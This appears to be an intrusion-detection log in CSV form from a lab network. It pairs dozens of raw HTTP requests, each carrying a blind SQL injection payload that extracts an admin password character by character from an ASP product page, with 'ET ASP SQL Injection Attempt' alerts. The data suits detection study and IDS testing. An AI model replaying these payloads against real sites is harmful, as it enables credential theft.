timestamp,msg,ip_src,src_port,ip_dst,dst_port
2019/03/24 15:35:47.290352,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),8,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56780,192.168.244.136,80
2019/03/24 15:35:47.290352 ,ET ASP SQL Injection Attempt,192.168.244.1,56780,192.168.244.136,80
2019/03/24 15:35:47.350682,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),2,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2048%20and%2050 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56781,192.168.244.136,80
2019/03/24 15:35:47.350682 ,ET ASP SQL Injection Attempt,192.168.244.1,56781,192.168.244.136,80
2019/03/24 15:35:47.413464,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),1,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2052%20and%2052 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56782,192.168.244.136,80
2019/03/24 15:35:47.413464 ,ET ASP SQL Injection Attempt,192.168.244.1,56782,192.168.244.136,80
2019/03/24 15:35:47.460245,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),13,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56783,192.168.244.136,80
2019/03/24 15:35:47.460245 ,ET ASP SQL Injection Attempt,192.168.244.1,56783,192.168.244.136,80
2019/03/24 15:35:47.525842,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),9,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56784,192.168.244.136,80
2019/03/24 15:35:47.525842 ,ET ASP SQL Injection Attempt,192.168.244.1,56784,192.168.244.136,80
2019/03/24 15:35:47.585009,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),14,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56785,192.168.244.136,80
2019/03/24 15:35:47.585009 ,ET ASP SQL Injection Attempt,192.168.244.1,56785,192.168.244.136,80
2019/03/24 15:35:47.648004,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),6,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2042 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56786,192.168.244.136,80
2019/03/24 15:35:47.648004 ,ET ASP SQL Injection Attempt,192.168.244.1,56786,192.168.244.136,80
2019/03/24 15:35:47.710368,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),4,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2093%20and%2099 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56787,192.168.244.136,80
2019/03/24 15:35:47.710368 ,ET ASP SQL Injection Attempt,192.168.244.1,56787,192.168.244.136,80
2019/03/24 15:35:47.757215,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),15,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56788,192.168.244.136,80
2019/03/24 15:35:47.757215 ,ET ASP SQL Injection Attempt,192.168.244.1,56788,192.168.244.136,80
2019/03/24 15:35:47.804840,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),10,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2080%20and%20105 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56789,192.168.244.136,80
2019/03/24 15:35:47.804840 ,ET ASP SQL Injection Attempt,192.168.244.1,56789,192.168.244.136,80
2019/03/24 15:35:47.851932,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),16,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2079 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56790,192.168.244.136,80
2019/03/24 15:35:47.851932 ,ET ASP SQL Injection Attempt,192.168.244.1,56790,192.168.244.136,80
2019/03/24 15:35:47.928824,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),3,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2058 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56791,192.168.244.136,80
2019/03/24 15:35:47.928824 ,ET ASP SQL Injection Attempt,192.168.244.1,56791,192.168.244.136,80
2019/03/24 15:35:47.992170,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),7,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2080%20and%2092 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56792,192.168.244.136,80
2019/03/24 15:35:47.992170 ,ET ASP SQL Injection Attempt,192.168.244.1,56792,192.168.244.136,80
2019/03/24 15:35:48.069704,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),11,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56793,192.168.244.136,80
2019/03/24 15:35:48.069704 ,ET ASP SQL Injection Attempt,192.168.244.1,56793,192.168.244.136,80
2019/03/24 15:35:48.116647,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),5,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2061 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56794,192.168.244.136,80
2019/03/24 15:35:48.116647 ,ET ASP SQL Injection Attempt,192.168.244.1,56794,192.168.244.136,80
2019/03/24 15:35:48.194408,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),12,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56795,192.168.244.136,80
2019/03/24 15:35:48.194408 ,ET ASP SQL Injection Attempt,192.168.244.1,56795,192.168.244.136,80
2019/03/24 15:35:48.257426,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),8,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2042 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56796,192.168.244.136,80
2019/03/24 15:35:48.257426 ,ET ASP SQL Injection Attempt,192.168.244.1,56796,192.168.244.136,80
2019/03/24 15:35:48.320138,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),2,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2051%20and%2051 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56797,192.168.244.136,80
2019/03/24 15:35:48.320138 ,ET ASP SQL Injection Attempt,192.168.244.1,56797,192.168.244.136,80
2019/03/24 15:35:48.367025,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),13,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56798,192.168.244.136,80
2019/03/24 15:35:48.367025 ,ET ASP SQL Injection Attempt,192.168.244.1,56798,192.168.244.136,80
2019/03/24 15:35:48.413793,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),9,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2042 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56799,192.168.244.136,80
2019/03/24 15:35:48.413793 ,ET ASP SQL Injection Attempt,192.168.244.1,56799,192.168.244.136,80
2019/03/24 15:35:48.476276,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),14,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56800,192.168.244.136,80
2019/03/24 15:35:48.476276 ,ET ASP SQL Injection Attempt,192.168.244.1,56800,192.168.244.136,80
2019/03/24 15:35:48.541517,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),6,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2043%20and%2047 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56801,192.168.244.136,80
2019/03/24 15:35:48.541517 ,ET ASP SQL Injection Attempt,192.168.244.1,56801,192.168.244.136,80
2019/03/24 15:35:48.585216,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),4,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%20100%20and%20102 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56802,192.168.244.136,80
2019/03/24 15:35:48.585216 ,ET ASP SQL Injection Attempt,192.168.244.1,56802,192.168.244.136,80
2019/03/24 15:35:48.632186,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),15,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2080%20and%20105 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56803,192.168.244.136,80
2019/03/24 15:35:48.632186 ,ET ASP SQL Injection Attempt,192.168.244.1,56803,192.168.244.136,80
2019/03/24 15:35:48.695050,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),10,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2080%20and%2092 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56804,192.168.244.136,80
2019/03/24 15:35:48.695050 ,ET ASP SQL Injection Attempt,192.168.244.1,56804,192.168.244.136,80
2019/03/24 15:35:48.757955,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),16,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2054 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56805,192.168.244.136,80
2019/03/24 15:35:48.757955 ,ET ASP SQL Injection Attempt,192.168.244.1,56805,192.168.244.136,80
2019/03/24 15:35:48.805240,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),3,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2055 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56806,192.168.244.136,80
2019/03/24 15:35:48.805240 ,ET ASP SQL Injection Attempt,192.168.244.1,56806,192.168.244.136,80
2019/03/24 15:35:48.851197,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),7,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2093%20and%2099 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56807,192.168.244.136,80
2019/03/24 15:35:48.851197 ,ET ASP SQL Injection Attempt,192.168.244.1,56807,192.168.244.136,80
2019/03/24 15:35:48.897446,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),11,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2042 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56808,192.168.244.136,80
2019/03/24 15:35:48.897446 ,ET ASP SQL Injection Attempt,192.168.244.1,56808,192.168.244.136,80
2019/03/24 15:35:48.944264,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),5,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2058 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56809,192.168.244.136,80
2019/03/24 15:35:48.944264 ,ET ASP SQL Injection Attempt,192.168.244.1,56809,192.168.244.136,80
2019/03/24 15:35:48.991153,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),12,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2042 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56810,192.168.244.136,80
2019/03/24 15:35:48.991153 ,ET ASP SQL Injection Attempt,192.168.244.1,56810,192.168.244.136,80
2019/03/24 15:35:49.055297,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),8,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2043%20and%2047 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56811,192.168.244.136,80
2019/03/24 15:35:49.055297 ,ET ASP SQL Injection Attempt,192.168.244.1,56811,192.168.244.136,80
2019/03/24 15:35:49.100988,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),2,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2052%20and%2052 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56812,192.168.244.136,80
2019/03/24 15:35:49.100988 ,ET ASP SQL Injection Attempt,192.168.244.1,56812,192.168.244.136,80
2019/03/24 15:35:49.155730,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),13,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2030%20and%2042 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56813,192.168.244.136,80
2019/03/24 15:35:49.155730 ,ET ASP SQL Injection Attempt,192.168.244.1,56813,192.168.244.136,80
2019/03/24 15:35:49.225786,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),9,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2043%20and%2047 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56815,192.168.244.136,80
2019/03/24 15:35:49.225786 ,ET ASP SQL Injection Attempt,192.168.244.1,56815,192.168.244.136,80
2019/03/24 15:35:49.273414,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),14,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2055%20and%2067 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56816,192.168.244.136,80
2019/03/24 15:35:49.273414 ,ET ASP SQL Injection Attempt,192.168.244.1,56816,192.168.244.136,80
2019/03/24 15:35:49.318963,"GET /productshow.asp?id=9%20and%20(select%20top%201%20asc(mid(cstr(password),6,1))%20from%20(Select%20Top%201%20*%20from%20[admin]%20where%201=1%20order%20by%20[username])%20T%20Order%20by%20[username]%20desc)%20between%2048%20and%2050 HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56817,192.168.244.136,80
2019/03/24 15:35:49.318963 ,ET ASP SQL Injection Attempt,192.168.244.1,56817,192.168.244.136,80
